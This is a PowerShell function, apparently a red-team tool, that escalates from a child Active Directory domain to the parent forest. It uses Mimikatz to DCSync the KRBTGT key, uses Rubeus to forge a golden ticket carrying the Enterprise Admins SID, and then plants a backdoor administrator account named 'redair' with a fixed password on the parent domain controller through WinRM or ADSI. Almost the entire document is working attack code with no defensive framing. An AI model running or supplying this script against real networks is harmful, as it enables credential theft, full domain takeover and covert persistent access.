function raiseChild {

    # *** Invoke-Mimikatz, Invoke-Rubeus and PowerView must be loaded first ***

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet('WinRM', 'ADSI')]
        [string]$Method
    )

    Write-Host "Preparing Child -> Parent escalation..." -ForegroundColor Green

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $parentDomain = $domain.Parent.Name
    $subdomain = ($domain.Name -split '\.')[0]
    $dsid = Get-DomainSID -Domain $domain
    $psid = Get-DomainSID -Domain $parentDomain

    Write-Host "Current Domain: $domain - SID: $dsid" -ForegroundColor Yellow
    Write-Host "DCSyncing KRBTGT..." -ForegroundColor Yellow

    # ---------- DCSync ----------
    $dcsyncCmd = '"lsadump::dcsync /user:' + $subdomain + '\krbtgt"'
    $out = Invoke-mimz -Command $dcsyncCmd

    $aes256Line = $out -split "`n" | Where-Object { $_ -match 'aes256_hmac' }
    $aes256Key = ($aes256Line -split ':\s+')[1].Trim()
    Write-Host "KRBTGT's AES256 Key: $aes256Key" -ForegroundColor Red

    # ---------- Golden ticket ----------
    $easid = $psid + "-519"

    $goldCmd = "golden /aes256:$aes256Key /user:Administrator /domain:$domain /sid:$dsid /sids:$easid /nowrap /ptt"
    Invoke-Rubeus -Command $goldCmd | Out-Null
    Write-Host "Elevating to Enterprise Administrator" -ForegroundColor Green

    $parentDC = (Get-DomainController -Domain $parentDomain).Name

    switch ($Method) {
        'WinRM' {
            Write-Host "Creating user 'redair' on $parentDC via WinRM..." -ForegroundColor Green
            Invoke-Command -ComputerName $parentDC -ScriptBlock {
                param($parentDomain)
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                New-ADUser -Name "redair" -SamAccountName "redair" -UserPrincipalName "redair@$parentDomain" -AccountPassword (ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force) -Enabled $true
                Add-ADGroupMember -Identity "Administrators" -Members "redair"
            } -ArgumentList $parentDomain
        }
        'ADSI' {
            Write-Host "Creating user 'redair' on $parentDomain via ADSI/LDAP..." -ForegroundColor Green

            $parentDCInfo = Get-DomainController -Domain $parentDomain | Select-Object -First 1
            $ldapHost = ($parentDCInfo.Name -replace '^\\\\', '') -replace '^\\', ''

            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$ldapHost/RootDSE")
            $baseDN = $rootDSE.Properties["defaultNamingContext"].Value
            $usersDN = "LDAP://$ldapHost/CN=Users,$baseDN"
            $users = New-Object System.DirectoryServices.DirectoryEntry($usersDN)

            $sam = "redair"
            $upn = "redair@$parentDomain"
            $pwdPlain = "Passw0rd!"

            # 1. Create the user object (no password yet)
            $newUser = $users.Children.Add("CN=$sam", "user")
            $newUser.Properties["sAMAccountName"].Value = $sam
            $newUser.Properties["userPrincipalName"].Value = $upn
            $newUser.Properties["displayName"].Value = $sam
            $newUser.Properties["userAccountControl"].Value = 544   # NORMAL_ACCOUNT | PASSWD_NOTREQD

            $newUser.CommitChanges()
            Write-Host "User object created." -ForegroundColor Green

            # 2. Set the password (the part that was failing)
            $newUser.Invoke("SetPassword", $pwdPlain)
            $newUser.Properties["userAccountControl"].Value = 0x10200  # NORMAL + DONT_EXPIRE
            $newUser.CommitChanges()
            Write-Host "Password set and account enabled." -ForegroundColor Green

            # 3. Add to Administrators
            $adminGroupDN = "LDAP://$ldapHost/CN=Administrators,CN=Builtin,$baseDN"
            $adminGroup = New-Object System.DirectoryServices.DirectoryEntry($adminGroupDN)
            $adminGroup.Properties["member"].Add($newUser.Properties["distinguishedName"].Value)
            $adminGroup.CommitChanges()
            Write-Host "User 'redair' added to Administrators." -ForegroundColor Green
        }
    }
    Write-Host "User 'redair' (Passw0rd!) should exist on $parentDomain with full admin rights" -ForegroundColor Green
}
